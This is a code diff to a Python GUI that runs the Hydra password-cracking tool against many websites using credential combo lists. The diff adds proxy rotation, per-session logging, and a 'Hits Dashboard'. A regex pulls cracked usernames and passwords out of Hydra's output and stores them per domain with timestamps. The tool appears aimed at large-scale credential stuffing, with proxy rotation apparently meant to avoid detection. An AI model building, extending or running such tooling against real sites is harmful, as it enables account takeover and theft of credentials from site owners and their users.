@@ -1,17 +1,21 @@
 import os
+import re
 import subprocess
 import threading
 import time
+from datetime import datetime
 from pathlib import Path
 
 import tkinter as tk
 from tkinter import messagebox, ttk
 
-from config import DATA_DIR, config
+from config import DATA_DIR, HITS_DIR, LOGS_DIR, config
 from helpers import get_site_filename, log_once
 
 
 class RunnerMixin:
+    HIT_RE = re.compile(r"login:\s*(?P<username>\S+)\s+password:\s*(?P<password>\S+)", re.IGNORECASE)
+
     def _append_hydra_log_threadsafe(self, text):
         self.ui_queue.put(("hydra_log", text))
 
@@ -69,7 +73,9 @@ class RunnerMixin:
         self.runner_tree.configure(yscrollcommand=tree_y.set, xscrollcommand=tree_x.set)
         self._bind_scroll_wheel(self.runner_tree)
 
-        log_section = ttk.LabelFrame(paned, text="Runner Log")
+        bottom_nb = ttk.Notebook(paned)
+
+        log_section = ttk.Frame(bottom_nb)
         log_section.columnconfigure(0, weight=1)
         log_section.rowconfigure(1, weight=1)
 
@@ -93,8 +99,24 @@ class RunnerMixin:
         self.hydra_log.configure(yscrollcommand=log_y.set, xscrollcommand=log_x.set)
         self._bind_scroll_wheel(self.hydra_log)
 
+        hits_section = ttk.Frame(bottom_nb)
+        hits_section.columnconfigure(0, weight=1)
+        hits_section.rowconfigure(0, weight=1)
+        hits_cols = ("Domain", "Username", "Password", "Timestamp")
+        self.hits_tree = ttk.Treeview(hits_section, columns=hits_cols, show="headings", height=12)
+        for col in hits_cols:
+            self.hits_tree.heading(col, text=col)
+            self.hits_tree.column(col, width=180, anchor="w")
+        self.hits_tree.grid(row=0, column=0, sticky="nsew")
+        hits_y = ttk.Scrollbar(hits_section, orient="vertical", command=self.hits_tree.yview)
+        hits_y.grid(row=0, column=1, sticky="ns")
+        self.hits_tree.configure(yscrollcommand=hits_y.set)
+
+        bottom_nb.add(log_section, text="Runner Log")
+        bottom_nb.add(hits_section, text="Hits Dashboard")
+
         paned.add(table_section, weight=3)
-        paned.add(log_section, weight=2)
+        paned.add(bottom_nb, weight=2)
 
         for var in (self.min_combos_var, self.min_hits_var, self.status_filter_var, self.last_run_filter_var):
             var.trace_add("write", lambda *_: self.apply_runner_filters_and_sort())
@@ -107,6 +129,8 @@ class RunnerMixin:
 
     def _normalize_status(self, data):
         status = str(data.get("status", "")).strip().lower()
+        if status in {"fetch_failed", "dns_failed", "tls_failed", "proxy_failed", "conn_closed"}:
+            return "Failed"
         if status in {"pending", "running", "failed", "success"}:
             return status.capitalize()
         return "Success" if data.get("form_found", False) else "Pending"
@@ -119,7 +143,7 @@ class RunnerMixin:
         selected_map = {row.get("site"): row.get("selected", False) for row in self.runner_rows_all}
         rows = []
         for base, data in self.processed_data.items():
-            hits_file = DATA_DIR / f"hits_{base.replace('.', '_')}.txt"
+            hits_file = HITS_DIR / f"{base.replace(':', '_')}.txt"
             hits_count = len(hits_file.read_text(encoding="utf-8").splitlines()) if hits_file.exists() else 0
             rows.append({
                 "site": base,
@@ -291,6 +315,8 @@ class RunnerMixin:
             self.ui_queue.put(("runner_done", "Runner disabled in config."))
             return
 
+        session_ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+        runner_log_file = LOGS_DIR / f"runner_{session_ts}.log"
         for site in sites:
             if self.cancel_event.is_set():
                 self._append_hydra_log_threadsafe("Runner cancelled by user.\n")
@@ -312,9 +338,16 @@ class RunnerMixin:
                 continue
 
             cmd = cmd_template.replace("{{combo_file}}", str(combo_file.resolve()))
-            burp_proxy = config.get("burp_proxy", "").strip()
+            burp_proxy = config.get("burp_proxy", "").strip() if bool(config.get("use_burp", False)) else ""
             if burp_proxy and " -p " not in f" {cmd} ":
                 cmd = f"{cmd} -p {burp_proxy}"
+            if bool(config.get("proxy_rotation", False)) and config.get("proxy_list_file", "").strip():
+                from proxies import ProxyManager
+
+                pm = ProxyManager(config.get("proxy_list_file", "").strip())
+                rotate_proxy = pm.get_proxy()
+                if rotate_proxy and " -p " not in f" {cmd} ":
+                    cmd = f"{cmd} -p {rotate_proxy['server']}"
 
             self._append_hydra_log_threadsafe(f"\n=== Starting command for {site} ===\n")
             self._append_hydra_log_threadsafe(f"Command: {cmd}\n")
@@ -328,12 +361,12 @@ class RunnerMixin:
                 self.runner_active_process = process
                 for line in iter(process.stdout.readline, ""):
                     self._append_hydra_log_threadsafe(line)
+                    with runner_log_file.open("a", encoding="utf-8") as lf:
+                        lf.write(line)
                     if self.cancel_event.is_set():
                         self.terminate_active_runner_process()
                         break
-                    if "[DATA]" in line and "password" in line.lower():
-                        with (DATA_DIR / f"hits_{site.replace('.', '_')}.txt").open("a", encoding="utf-8") as hf:
-                            hf.write(line.strip() + "\n")
+                    self._capture_hit(site, line)
 
                 process.wait(timeout=3)
                 if process.returncode == 0 and not self.cancel_event.is_set():
@@ -361,6 +394,25 @@ class RunnerMixin:
                 row["status"] = status
                 break
         self.ui_queue.put(("runner_refresh", None))
+
+    def _capture_hit(self, site, line):
+        if "[DATA]" not in line or "password" not in line.lower():
+            return
+        stamp = datetime.now().isoformat(timespec="seconds")
+        match = self.HIT_RE.search(line)
+        username = match.group("username") if match else "unknown"
+        password = match.group("password") if match else "unknown"
+        hit_line = f"{stamp} {username}:{password}"
+
+        legacy_file = DATA_DIR / f"hits_{site.replace('.', '_')}.txt"
+        with legacy_file.open("a", encoding="utf-8") as hf:
+            hf.write(line.strip() + "\n")
+
+        domain_file = HITS_DIR / f"{site.replace(':', '_')}.txt"
+        with domain_file.open("a", encoding="utf-8") as hf:
+            hf.write(hit_line + "\n")
+
+        self.ui_queue.put(("runner_hit", {"domain": site, "username": username, "password": password, "timestamp": stamp}))
 
     def terminate_active_runner_process(self):
         proc = self.runner_active_process
